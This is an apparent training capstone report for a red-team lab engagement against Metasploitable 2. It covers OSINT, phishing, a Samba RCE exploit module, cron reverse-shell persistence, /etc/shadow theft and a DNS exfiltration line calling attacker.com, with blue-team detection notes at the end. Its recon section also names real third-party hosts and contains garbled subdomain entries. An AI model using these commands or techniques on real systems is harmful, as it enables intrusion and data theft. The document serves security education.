# Final Red Team Engagement Report: Full Attack Lifecycle
**Date:** August 29, 2025  
**Attacker IP:** 192.168.180.129 (Kali Linux)  
**Target IP:** 192.168.180.128 (Metasploitable 2)  
**Status:** Engagement Completed  

---

## 1. OSINT and Reconnaissance
**Objective:** Identify the external digital footprint and vulnerable services.  
**Tools Used:** Recon-ng, Shodan.

### Subdomain Enumeration Log

| Subdomain | IP Address | Notes |
| :--- | :--- | :--- |
| ://tesla.com | 23.62.104.69 | Identified via HackerTarget module |
| ://tesla.com | 199.232.38.92 | Amazon infrastructure asset |

### Shodan Exposure Summary
**Query:** `apache country:US`  
**Findings:** Identified over 4.1 million exposed Apache hosts. Specifically, host **54.197.224.100** was found running an outdated version of Apache (2.4.62) with directory listing enabled, allowing for server header disclosure and version-specific targeting.

---

## 2. Phishing Simulation
**Objective:** Gain initial access through credential harvesting.  
**Tools Used:** Social Engineering Toolkit (SET).

### Credential Harvest Log

| Timestamp | IP Address | Username | Password (Status) | Risk |
| :--- | :--- | :--- | :--- | :--- |
| 12:00:00 | 127.0.0.1 | victim@test.com | [INTERCEPTED] | **Critical** |

**Outcome:** Successfully cloned a legitimate login portal. The intercepted POST request contained the victim's email and encrypted password, demonstrating a high risk of initial breach via social engineering.

---

## 3. Vulnerability Exploitation
**Objective:** Gain remote command execution on the target server.  
**Tools Used:** Nmap, Metasploit.

### Exploitation Summary
**Discovery:** Nmap scan confirmed port 445 open with Samba version 3.0.20.  
**Exploit:** `exploit/multi/samba/usermap_script`


| Vulnerability | CVSS Score | Description |
| :--- | :--- | :--- |
| Samba RCE | 10.0 | CVE-2007-2447: Remote Root Shell access |

**Result:** Successfully established a remote shell session with **ROOT** privileges.

---

## 4. Lateral Movement and Persistence
**Objective:** Map the internal network and ensure permanent access.  
**Tools Used:** Metasploit (Meterpreter), Cron.

### Pivoting & Persistence Table

| Technique | MITRE Tactic | Description |
| :--- | :--- | :--- |
| **Autoroute** | Lateral Movement | Routed traffic to 192.168.180.0/24 via Session 2 |
| **Cron Job** | Persistence | Created `/etc/cron.d/persistence` for 1-minute reverse shell |

---

## 5. Social Engineering Lab
**Objective:** Gather deep OSINT to build a high-success vishing pretext.  
**Tools Used:** PhoneInfoga, Maltego.

### Intel Log

| Target ID | Data Source | Information | Notes |
| :--- | :--- | :--- | :--- |
| TID001 | PhoneInfoga | Carrier: Verizon | Identified via local scanners |

**Vishing Scenario:** Posed as "Carrier Security Support" regarding a security sync error. Successfully persuaded the target to reveal their employee ID and a verification code by establishing trust using OSINT data.

---

## 6. Exploit Development Basics
**Objective:** Identify and exploit memory vulnerabilities in binary programs.  
**Tools Used:** GCC, GDB.

### Findings
*   **Unsafe Function:** Identified `gets()` in `vuln.c`, which lacks bounds checking.
*   **PoC:** A 40-character payload successfully triggered a **Segmentation Fault** and overwrote the `overflow` variable to `0x41414141` (AAAA), proving control over memory registers.

---

## 7. Post-Exploitation and Exfiltration
**Objective:** Steal sensitive administrative data and exit the network stealthily.  
**Tools Used:** Linux Shell, DNS.

### Data Theft Log
*   **Credential Dump:** Intercepted `/etc/shadow` file containing SHA-512 administrative password hashes.
*   **DNS Exfiltration:** Encoded sensitive strings (Credit Card/Admin Hashes) into DNS lookups:  
    `nslookup SECRET_FILE_://attacker.com`

---

## 8. Red Team Attack Flowchart
**Objective:** Visualize the complete attack lifecycle (The Kill Chain).  

**Path:**  
`Recon (Shodan) -> Initial Access (Phishing) -> Exploitation (Samba RCE) -> Lateral Movement (Pivoting) -> Persistence (Cron Job) -> Exfiltration (DNS Tunnel)`

---

## 9. Capstone Project Summary

### Engagement Summary (200 Words)
The engagement successfully simulated a full-scale breach on the target network. Beginning with OSINT, we identified unpatched Samba services. Initial access was bolstered by a phishing simulation, but full control was achieved via an RCE exploit on port 445. We demonstrated persistent access through a malicious cron job and moved laterally by pivoting through the compromised host. Finally, administrative hashes were dumped and exfiltrated via DNS tunneling. The results highlight critical failures in patch management and internal network monitoring.

### Blue Team Analysis (Detection Points)

| Timestamp | Alert Description | Source IP | MITRE Technique |
| :--- | :--- | :--- | :--- |
| 12:30:00 | Exploitation: Samba RCE | 192.168.180.129 | T1210 |
| 13:00:00 | Persistence: New Cron Job | Localhost | T1053 |

### Non-Technical Briefing (100 Words)
Our security assessment successfully identified critical weaknesses in your digital perimeter. We were able to trick a user into providing credentials and subsequently take full control of a central server. This allowed us to hide a 'backdoor' for future access and steal sensitive internal data without being detected by standard security software. We recommend immediate updates to your web servers and the introduction of stronger login requirements (MFA) to ensure that stolen passwords alone cannot be used to breach your systems.
